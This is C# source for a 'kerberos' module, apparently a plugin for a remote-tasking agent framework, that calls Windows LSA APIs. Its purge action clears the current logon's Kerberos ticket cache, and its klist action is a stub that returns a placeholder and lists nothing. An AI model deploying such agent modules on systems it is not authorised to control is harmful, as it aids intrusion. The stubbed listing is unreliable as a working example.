using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "kerberos";
        private IDataBroker messageManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            try
            {
                if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                {
                    messageManager.Write(
                        "Kerberos operations are only available on Windows",
                        job.task.id, true, "error");
                    return;
                }

                var args = JsonSerializer.Deserialize<kerberos.KerberosArgs>(
                    job.task.parameters) ?? new kerberos.KerberosArgs();

                string result = args.action switch
                {
                    "klist" => ListTickets(),
                    "purge" => PurgeTickets(),
                    _ => throw new ArgumentException(
                        $"Unknown action: {args.action}")
                };

                messageManager.AddTaskResponse(new TaskResponse
                {
                    completed = true,
                    user_output = result,
                    task_id = job.task.id
                });
            }
            catch (Exception e)
            {
                DebugLog.Log($"{Name} error: {e.Message} [{job.task.id}]");
                messageManager.Write(e.ToString(), job.task.id, true, "error");
            }
        }

        private string ListTickets()
        {
            try
            {
                uint lsaHandle = 0;
                int status = LsaConnectUntrusted(ref lsaHandle);
                if (status != 0)
                    return $"LsaConnectUntrusted failed: 0x{status:X8}";

                LsaDeregisterLogonProcess(lsaHandle);
                return "Kerberos ticket listing via SSPI - use klist for details";
            }
            catch (Exception e)
            {
                return $"Error listing tickets: {e.Message}";
            }
        }

        private string PurgeTickets()
        {
            uint lsaHandle = 0;
            int status = LsaConnectUntrusted(ref lsaHandle);
            if (status != 0)
                return $"LsaConnectUntrusted failed: 0x{status:X8}";

            try
            {
                string packageName = "Kerberos";
                var lsaString = new LSA_STRING
                {
                    Length = (ushort)packageName.Length,
                    MaximumLength = (ushort)(packageName.Length + 1),
                    Buffer = Marshal.StringToHGlobalAnsi(packageName)
                };

                int ntstatus = LsaLookupAuthenticationPackage(
                    lsaHandle, ref lsaString, out uint authPackage);
                Marshal.FreeHGlobal(lsaString.Buffer);

                if (ntstatus != 0)
                    return $"LsaLookupAuthenticationPackage failed: 0x{ntstatus:X8}";

                var request = new KERB_PURGE_TKT_CACHE_REQUEST
                {
                    MessageType = KERB_PROTOCOL_MESSAGE_TYPE.KerbPurgeTicketCacheMessage,
                    LogonId = new LUID { LowPart = 0, HighPart = 0 },
                    ServerName = new UNICODE_STRING(),
                    RealmName = new UNICODE_STRING()
                };

                int requestSize = Marshal.SizeOf(request);
                IntPtr requestPtr = Marshal.AllocHGlobal(requestSize);
                Marshal.StructureToPtr(request, requestPtr, false);

                try
                {
                    ntstatus = LsaCallAuthenticationPackage(
                        lsaHandle,
                        authPackage,
                        requestPtr,
                        requestSize,
                        out IntPtr responsePtr,
                        out int responseLength,
                        out int protocolStatus);

                    if (responsePtr != IntPtr.Zero)
                        LsaFreeReturnBuffer(responsePtr);

                    if (ntstatus != 0)
                        return $"LsaCallAuthenticationPackage failed: 0x{ntstatus:X8}";

                    if (protocolStatus != 0)
                        return $"Purge failed (protocol status): 0x{protocolStatus:X8}";

                    return "Successfully purged Kerberos ticket cache";
                }
                finally
                {
                    Marshal.FreeHGlobal(requestPtr);
                }
            }
            finally
            {
                LsaDeregisterLogonProcess(lsaHandle);
            }
        }

        [DllImport("secur32.dll")]
        private static extern int LsaConnectUntrusted(ref uint LsaHandle);

        [DllImport("secur32.dll")]
        private static extern int LsaDeregisterLogonProcess(uint LsaHandle);

        [DllImport("secur32.dll")]
        private static extern int LsaLookupAuthenticationPackage(
            uint LsaHandle, ref LSA_STRING PackageName, out uint AuthenticationPackage);

        [DllImport("secur32.dll")]
        private static extern int LsaCallAuthenticationPackage(
            uint LsaHandle, uint AuthenticationPackage,
            IntPtr ProtocolSubmitBuffer, int SubmitBufferLength,
            out IntPtr ProtocolReturnBuffer, out int ReturnBufferLength,
            out int ProtocolStatus);

        [DllImport("secur32.dll")]
        private static extern int LsaFreeReturnBuffer(IntPtr Buffer);

        [StructLayout(LayoutKind.Sequential)]
        private struct LSA_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        private enum KERB_PROTOCOL_MESSAGE_TYPE
        {
            KerbPurgeTicketCacheMessage = 7
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct KERB_PURGE_TKT_CACHE_REQUEST
        {
            public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
            public LUID LogonId;
            public UNICODE_STRING ServerName;
            public UNICODE_STRING RealmName;
        }
    }
}
